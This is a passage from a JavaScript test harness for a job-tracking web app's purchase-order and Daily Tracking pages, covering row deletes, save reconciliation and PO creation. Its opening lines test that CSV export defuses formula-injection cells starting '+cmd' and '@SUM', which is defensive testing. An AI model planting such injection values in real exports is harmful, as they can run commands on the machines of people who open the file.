          && cells.some(c => c.startsWith('"\'+cmd')) && cells.some(c => c.startsWith('"\'@SUM')), csv);
      assert('  and a plain number is left as it is', cells.some(c => c === '"-2"'), csv);
    }

    console.log(`\n[${page}: deleting a row]`);
    {
      // The page's own row-write functions, against a stub network.
      const dctx = vm.createContext({ console, Promise, setTimeout, clearTimeout, String, Array, Set, Object, Boolean, JSON, encodeURIComponent });
      vm.runInContext(`
        const API_BASE = '/api', DIVISION = 'turf', fctToken = 't';
        let _aggCacheRowCount = 0, _projSubAggCacheRowCount = 0, _poSaving = false;
        const _deletedRowIds = new Set(), _drRowWrites = {}, _drSaveTimers = {}, _drSavePending = {};
        const _drDeletesOwed = new Set(), _poAfterSave = [];
        const _DR_WRITE_WAIT_MS = 60;
        const calls = [], walGone = [], dropped = [];
        function _fetchRetry(url, opts) { calls.push(opts.method + ' ' + url); return Promise.resolve({ ok: true, status: 200 }); }
        function _walRemove(id) { walGone.push(id); }
        function _drSaveStart() {} function _drSaveOk() {} function _drSaveFail() {} function _drAdoptPO() {}
        function saveProjectIndex() {}
        function _drDropRowLocally(id) { dropped.push(id); }
      `, dctx);
      ['_drTrackWrite', '_drWaitForWrites', '_drMarkDeleted', '_drForgetRow', 'drDelete', 'drDeleteBySubCode', '_poRowDelete']
        .forEach(n => vm.runInContext(requireFn(src, n, page), dctx));
      const d = e => vm.runInContext(e, dctx);
      const wait = ms => new Promise(r => setTimeout(r, ms));

      // A write of the row that never answers (a dead connection).
      d(`_drTrackWrite('r1', new Promise(() => {})); drDelete('r1');`);
      await wait(10);
      assert('a DELETE waits for a write of its row still out', !d(`calls.some(c => /id=r1$/.test(c))`)
        && d(`_drDeletesOwed.has('r1')`));
      await wait(120);
      assert('  but not for ever: one that never answers is given up on and the DELETE goes',
        d(`calls.some(c => c === 'DELETE /api/daily-rows?division=turf&id=r1')`) && !d(`_drDeletesOwed.has('r1')`),
        d(`JSON.stringify(calls)`));

      // A write that lands a moment later: the DELETE follows it.
      d(`_drTrackWrite('r2', new Promise(ok => setTimeout(() => { calls.push('PUT r2 landed'); ok(); }, 20))); drDelete('r2');`);
      await wait(50);
      assert('  one that lands goes first', d(`calls.indexOf('PUT r2 landed') >= 0
        && calls.indexOf('PUT r2 landed') < calls.indexOf('DELETE /api/daily-rows?division=turf&id=r2')`), d(`JSON.stringify(calls)`));

      // A write owed: an edit's debounce, and the write-ahead log.
      d(`_drSavePending.r3 = {}; _drSaveTimers.r3 = setTimeout(() => calls.push('owed PUT r3'), 20); drDelete('r3');`);
      await wait(50);
      assert('a write of the row still owed is dropped, debounce and write-ahead log alike',
        !d(`calls.includes('owed PUT r3')`) && d(`walGone.includes('put_r3') && walGone.includes('post_r3')`)
        && d(`!('r3' in _drSavePending) && _deletedRowIds.has('r3')`));

      // Behind a purchase-order save still out: only the DELETE waits.
      d(`_poSaving = true; _poRowDelete('r4');`);
      assert('a row deleted while an order save is out is marked at once, its DELETE held for the save',
        d(`_deletedRowIds.has('r4') && _poAfterSave.includes('r4') && !calls.some(c => /id=r4$/.test(c))`));
      d(`_poSaving = false;`);

      // A sub code removed: its rows are marked and their writes waited for.
      d(`_drTrackWrite('r5', new Promise(() => {})); drDeleteBySubCode('SC', ['r5']);`);
      assert('a bulk delete marks the rows it takes', d(`_deletedRowIds.has('r5')`));
      await wait(10);
      assert('  and waits for their writes', !d(`calls.some(c => /subCode=SC$/.test(c))`));
      await wait(120);
      assert('  for as long as a single delete does', d(`calls.some(c => /subCode=SC$/.test(c))`), d(`JSON.stringify(calls)`));

      d(`_drForgetRow('r6')`);
      assert('a row the server says it deleted leaves this page, its writes refused',
        d(`dropped.includes('r6') && _deletedRowIds.has('r6')`));
    }

    console.log(`\n[${page}: a save's answer held while a box had focus]`);
    {
      const { ctx } = sandbox(src, page);
      const links = (poId, lineId, rowId) => new Map([[poId, new Map([[lineId, rowId]])]]);
      // A row write's answer (12:00:30) set L1 to 12 in Daily Tracking; a save's
      // answer from 12:00:20, held while a box had focus, still says 10.
      const local = order({ lines: [{ id: 'L1', qty: '12', unit_cost: '16', po_row_id: 'r1' }] });
      ctx.purchaseOrders.push(local);
      ctx._poSeenOrder('po3', '2026-11-18T12:00:30.000Z');
      const n = ctx._poAdoptSaved([order({ lines: [{ id: 'L1', qty: '10', unit_cost: '16', po_row_id: 'r1' }] })],
        links('po3', 'L1', 'r1'), '2026-11-18T12:00:20.000Z');
      assert('an older copy of an order is not taken over a newer one already in hand',
        n === 0 && local.lines[0].qty === '12', JSON.stringify(local.lines));
      // The same copy, current: taken.
      ctx._poAdoptSaved([order({ lines: [{ id: 'L1', qty: '10', unit_cost: '16', po_row_id: 'r1' }] })],
        links('po3', 'L1', 'r1'), '2026-11-18T12:00:40.000Z');
      assert('  a current one is', local.lines[0].qty === '10', JSON.stringify(local.lines));

      // A save that left before the first figure was typed: the delivery
      // unlinked there, and the row minted since recorded beside it.
      const typed = order({ id: 'po7', po_number: 'PO-0007', lines: [{ id: 'L7', qty: '21.54', unit_cost: '21.75', po_row_id: 'rB' }] });
      ctx.purchaseOrders.push(typed);
      ctx._poNoteLinkChange('L7', 'rB');
      ctx._poAdoptSaved([order({ id: 'po7', po_number: 'PO-0007', lines: [
          { id: 'L7', qty: '', unit_cost: '', po_row_id: null },
          { id: 'dr-rB', source: 'daily', qty: '2', unit_cost: '', po_row_id: 'rB' } ] })],
        links('po7', 'L7', null), '2026-11-18T12:00:50.000Z');
      assert('a link minted while the save was out stays', typed.lines[0].po_row_id === 'rB', JSON.stringify(typed.lines));
      assert('  and no "from Daily Tracking" copy of its own row is shown beside it',
        typed.lines.length === 1, JSON.stringify(typed.lines));

      // The server put back the row purchasing raised for a delivery (rA) over
      // the one minted here from a stale copy (rT), which it deletes.
      const relinked = order({ id: 'po8', po_number: 'PO-0008', lines: [{ id: 'L8', qty: '3', unit_cost: '4', po_row_id: 'rT' }] });
      ctx.purchaseOrders.push(relinked);
      ctx._poNoteLinkChange('L8', 'rT');
      ctx._poForgetSentLinks(links('po8', 'L8', 'rT'));
      ctx._poAdoptSaved([order({ id: 'po8', po_number: 'PO-0008', lines: [{ id: 'L8', qty: '3', unit_cost: '4', po_row_id: 'rA' }] })],
        links('po8', 'L8', 'rT'), '2026-11-18T12:01:00.000Z');
      assert('a link the server put back over the one this save sent is taken',
        relinked.lines[0].po_row_id === 'rA', JSON.stringify(relinked.lines));
    }

    console.log(`\n[${page}: the once-per-load catch-up]`);
    {
      const { ctx, state } = sandbox(src, page);
      ctx.purchaseOrders.push(order());
      const listBack = [order({ lines: [{ id: 'dr-r1', source: 'daily', qty: '20', unit_cost: '16', po_row_id: 'r1' }] })];
      state.reply = (url, opts) => json({ ok: true, changed: 1, purchaseOrders: listBack, updatedAt: '2026-11-10T00:00:05.000Z' });
      await ctx._poServerCatchUp();
      const f = state.fetches[0];
      assert('the server is asked, for this division', f && /\/purchase-orders\?division=turf&reconcile=1$/.test(f.url) && f.opts.method === 'POST', f && f.url);
      assert('its list is taken on', ctx.purchaseOrders.length === 1 && ctx.purchaseOrders[0].lines[0].id === 'dr-r1');
      assert('  with the version it came from', ctx._poBaseUpdatedAt === '2026-11-10T00:00:05.000Z');
      const view = sandbox(src, page);
      view.ctx.perm.canEdit = false;
      await view.ctx._poServerCatchUp();
      const robot = sandbox(src, page);
      robot.ctx._AUTO_REPORT = true;
      await robot.ctx._poServerCatchUp();
      assert('a view-only user and the report robot never ask', !view.state.fetches.length && !robot.state.fetches.length);
      const nothing = sandbox(src, page);
      nothing.ctx.purchaseOrders.push(order({ title: 'mine' }));
      nothing.state.reply = () => json({ ok: true, changed: 0, purchaseOrders: [], updatedAt: 'x' });
      await nothing.ctx._poServerCatchUp();
      assert('an answer that changed nothing leaves the list alone',
        nothing.ctx.purchaseOrders.length === 1 && nothing.ctx._poBaseUpdatedAt === 'v0');
    }

    console.log(`\n[${page}: PO numbers with no order, and raising one]`);
    {
      const { ctx, state } = sandbox(src, page);
      ctx.purchaseOrders.push(order(), order({ id: 'poZ', po_number: 'PO-0020', project_id: 'job2' }));
      ctx.projectsList.push(
        { id: 'job1', 'project-name': 'Main St', dailyRows: [
          { id: 'a', po_num: 'PO-0099', date: '2026-10-30', material: '#2 stone', cost_code: '02-200', sub_code: '0500', material_cost: '320' },
          { id: 'b', po_num: 'po-0099', date: '2026-10-28', material_cost: '100' },
          { id: 'c', po_num: 'PO-0020' },
          { id: 'd', po_num: 'PO-0003' } ] },
        { id: 'job2', 'project-name': 'Oak Ave', dailyRows: [] });
      const groups = ctx._dailyPONumbersWithoutOrder();
      const g99 = groups.find(g => g.poNum.toLowerCase() === 'po-0099');
      assert('a number no order holds is listed, its rows together', g99 && g99.rows === 2 && g99.material === 420, JSON.stringify(groups));
      assert('a number another job holds is listed with that order',
        groups.some(g => g.poNum === 'PO-0020' && g.elsewhere && g.elsewhere.id === 'poZ'));
      assert('a number the job has an order for is not', !groups.some(g => g.poNum === 'PO-0003'));
      const html = ctx._poDailyOrphansHTML();
      assert('the notice offers to raise the missing one', /createPOFromDaily\('job1','PO-0099'\)/.test(html));
      assert('  but not one that exists on another job', !/createPOFromDaily\('job1','PO-0020'\)/.test(html) && /is on Oak Ave/.test(html));

      let posted = null;
      state.reply = (url, opts) => { posted = { url, body: JSON.parse(opts.body), method: opts.method };
        return json({ ok: true, purchaseOrder: Object.assign({}, JSON.parse(opts.body).purchaseOrder,
          { lines: [{ id: 'dr-a', source: 'daily', po_row_id: 'a' }] }) }); };
      await ctx.createPOFromDaily('job1', 'PO-0020');
      assert('it will not raise a number the division already has', posted === null);
      await ctx.createPOFromDaily('job1', 'PO-0099');
      assert('raising one saves that order alone', posted && posted.method === 'POST'
        && /\/purchase-orders\?division=turf$/.test(posted.url) && posted.body.purchaseOrder && !posted.body.purchaseOrders);
      const made = ctx.purchaseOrders.find(p => p.po_number === 'PO-0099');
      assert('  on the job, headed from its rows', made && made.project_id === 'job1' && made.title === '#2 stone'
        && made.cost_code === '02-200' && made.date_created === '2026-10-28');
      assert('  taking on what the server recorded on it', made && made.lines.length === 1 && made.lines[0].id === 'dr-a');
      assert('  and never as a whole-list save', state.saves === 0);

      const broken = sandbox(src, page);
      broken.ctx._poLoadOk = false;
      broken.ctx.projectsList.push({ id: 'job1', 'project-name': 'Main St', dailyRows: [{ id: 'a', po_num: 'PO-0003' }] });
      broken.state.reply = () => { throw new Error('must not save'); };
      assert('after a failed read there is no notice at all', broken.ctx._poDailyOrphansHTML() === '');
      await broken.ctx.createPOFromDaily('job1', 'PO-0003');
      assert('  and Create does nothing', !broken.state.fetches.length && !broken.ctx.purchaseOrders.length);
      assert('  nor is any PO # cell flagged', !/outline/.test(broken.ctx.makePOSelect('job1', 'PO-0003', 0, undefined)));
    }

    console.log(`\n[${page}: the PO # cell, deletes and header edits]`);
    {
      const { ctx, state } = sandbox(src, page);
      const raised = { id: 'L1', qty: '5', unit_cost: '10', po_row_id: 'r2' };
      const daily  = { id: 'dr-r1', source: 'daily', qty: '20', unit_cost: '16', po_row_id: 'r1' };
      const po = order({ title: 'Stone', supplier: 'Acme', cost_code: '300', sub_code: 'C', po_number: 'PO-0007', lines: [daily, raised] });
      ctx.purchaseOrders.push(po);
      const links = ctx._poLinksByRow();
      assert('the PO # cell is locked on a row the order raised', /\sdisabled\b/.test(ctx.makePOSelect('job1', 'PO-0007', 0, links.get('r2'))));
      assert('  and free on a Daily Tracking delivery', !/\sdisabled\b/.test(ctx.makePOSelect('job1', 'PO-0007', 1, links.get('r1'))));
      assert('a number with no order on the job is flagged', /outline:1px solid var\(--yellow\)/.test(ctx.makePOSelect('job1', 'PO-0999', 2, undefined)));
      assert('_poRowRaisedByOrder tells the two apart', ctx._poRowRaisedByOrder('r2') && !ctx._poRowRaisedByOrder('r1') && !ctx._poRowRaisedByOrder('zz'));

      const r1 = { id: 'r1', material: '57 stone', supplier: 'Quarry Co', cost_code: '02-100', sub_code: '0420', po_num: 'PO-0003' };
      const r2 = { id: 'r2', material: '', supplier: '', cost_code: '', sub_code: '', po_num: '' };
      ctx.projectsList.push({ id: 'job1', dailyRows: [r1, r2], _drFullLoaded: true });
      vm.runInContext('_syncPOHeaderToLines(purchaseOrders[0], true)', ctx);
      assert('a header edit leaves a Daily Tracking row\'s own codes, material and supplier',
        r1.cost_code === '02-100' && r1.material === '57 stone' && r1.supplier === 'Quarry Co', JSON.stringify(r1));
      assert('  but gives it the order\'s number', r1.po_num === 'PO-0007');
      assert('the raised row follows the order as before', r2.cost_code === '300' && r2.material === 'Stone' && r2.po_num === 'PO-0007');

      vm.runInContext("deletePOLine('po3', 'dr-r1')", ctx);
      assert('a Daily Tracking delivery cannot be deleted from the order', po.lines.includes(daily) && state.saves === 0);

      ctx._detachLinkedRows(id => id === 'r1');
      assert('deleting its row takes it off the order here too', !po.lines.includes(daily) && po.lines.includes(raised));
      ctx._detachLinkedRows(id => id === 'r2');
      assert('a raised line is detached as before', raised.po_row_id === null && raised.qty === '5');
      // A row deleted on its own (the Daily Tracking ✕) takes a delivery typed
      // on the order with it, and the save says it was deleted.
      const typed = { id: 'L9', qty: '4', unit_cost: '2', po_row_id: 'r9' };
      po.lines.push(typed);
      state.projectRenders.length = 0;
      ctx._detachLinkedRows(id => id === 'r9', { withDeliveries: true });
      assert('the job\'s own purchase-order panel is drawn again', state.projectRenders.includes('job1'),
        JSON.stringify(state.projectRenders));
      assert('a row deleted on its own takes the delivery typed on the order with it',
        !po.lines.includes(typed), JSON.stringify(po.lines));
      assert('  recorded as deleted, so the save does not get it back from the stored order',
        vm.runInContext("Boolean(_poDeletedLines.po3 && _poDeletedLines.po3.has('L9'))", ctx));
    }
  }

  // ══ 3. Central purchasing ═════════════════════════════════════════════════
  console.log('\n[purchase-orders.html]');
  {
    const src = read('purchase-orders.html');
    const ctx = vm.createContext({ String, Boolean });
    vm.runInContext(requireFn(src, 'esc') + requireFn(src, 'isDailyLine') + requireFn(src, 'dailyLineTagHTML'), ctx);
    const tag = ctx.dailyLineTagHTML({ source: 'daily', cost_code: '02-100', sub_code: '0420' });
    assert('a Daily Tracking delivery is tagged with its row\'s codes', /from Daily Tracking/.test(tag) && /02-100 \/ 0420/.test(tag), tag);
    assert('an ordinary one is not', ctx.dailyLineTagHTML({ id: 'L1' }) === '');
    const rows = requireFn(src, 'lineRowsHTML');
    assert('the delivery rows draw the tag', /dailyLineTagHTML\(l\)/.test(rows));
    assert('  and a lock in place of the ✕ on a Daily Tracking line', /isDailyLine\(l\)\s*\n\s*\? '<span[\s\S]{0,300}?&#128274;<\/span>'/.test(rows));
    assert('deleteLine refuses one', /if \(isDailyLine\(\(po\.lines \|\| \[\]\)\.find\(l => l\.id === lineId\)\)\) return;/.test(requireFn(src, 'deleteLine')));
    assert('an edit is remembered per line, per key', /noteEdit\(_editedLines, poId, lineEditKey\(lineId, field\)\);/.test(requireFn(src, 'setLineField')));
    const write = requireFn(src, '_savePOWrite');
    assert('every save says which lines it edited', /editedLineIds:\s*editedLinesFor\(po\.id, sentEdits\),/.test(write));
    assert('  and which keys of each', /editedLineFields:\s*editedLineFieldsFor\(po\.id, sentEdits\),/.test(write));
    assert('  and forgets them once the server has them', /clearSentEdits\(_editedLines, po\.id, sentEdits\);/.test(write));
    assert('so does the save made as the tab closes', /editedLineIds:\s*editedLinesFor\(id\),/.test(src));

    // The page's own bookkeeping, run. A delivery edited AGAIN while the save
    // carrying its first edit was in flight is still owed to the next save.
    // With a plain set the first save's landing forgot it, the queued save went
    // out saying the line was untouched, and the server kept the row's figures
    // over the second edit.
    const bk = vm.createContext({});
    vm.runInContext('const _editedLines = {}; let _editSeq = 0;' +
      ['noteEdit', 'pendingEdits', 'clearSentEdits', 'lineEditKey', 'lineEditSplit', 'editedLinesFor', 'editedLineFieldsFor']
        .map(n => requireFn(src, n)).join('\n'), bk);
    const run = e => vm.runInContext(e, bk);
    run(`noteEdit(_editedLines, 'po1', lineEditKey('dr-r1', 'qty')); noteEdit(_editedLines, 'po1', lineEditKey('dr-r2', 'date'));
         var sent = pendingEdits(_editedLines, 'po1');                // the first save leaves
         noteEdit(_editedLines, 'po1', lineEditKey('dr-r1', 'qty'));   // edited again meanwhile
         clearSentEdits(_editedLines, 'po1', sent);                   // the first save lands`);
    assert('  a line edited again while its save was in flight is still sent',
      run('JSON.stringify(editedLinesFor("po1"))') === '["dr-r1"]', run('JSON.stringify(editedLinesFor("po1"))'));
    assert('  with the key that was edited',
      run('JSON.stringify(editedLineFieldsFor("po1"))') === '{"dr-r1":["qty"]}', run('JSON.stringify(editedLineFieldsFor("po1"))'));
    run(`clearSentEdits(_editedLines, 'po1', pendingEdits(_editedLines, 'po1'))`);
    assert('  and forgotten once a save carrying it lands', run('JSON.stringify(editedLinesFor("po1"))') === '[]'
      && run('"po1" in _editedLines') === false);
  }

  console.log('\n────────────────────────────────────────');
  console.log(`  ${passed} passed, ${failed} failed`);
  console.log('────────────────────────────────────────\n');
  process.exit(failed === 0 ? 0 : 1);
})().catch(err => { console.error('crashed:', err); process.exit(1); });
